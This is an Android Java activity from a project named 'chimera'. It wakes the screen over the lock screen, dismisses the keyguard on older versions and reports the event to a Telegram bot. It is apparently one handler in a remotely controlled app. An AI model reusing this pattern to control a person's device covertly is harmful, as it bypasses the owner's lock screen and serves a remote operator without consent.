package com.chimera;

import android.app.Activity;
import android.os.Build;
import android.os.Bundle;
import android.view.WindowManager;

public class WakeActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
                setShowWhenLocked(true);
                setTurnScreenOn(true);
            } else {
                getWindow().addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                                     WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                                     WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                                     WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
            }
            TelegramBotWorker.sendMessage("Screen wake-up signal sent.", this);
        } catch (Exception e) {
            ErrorLogger.logError(this, "WakeActivity", e);
        } finally {
            finish();
        }
    }
}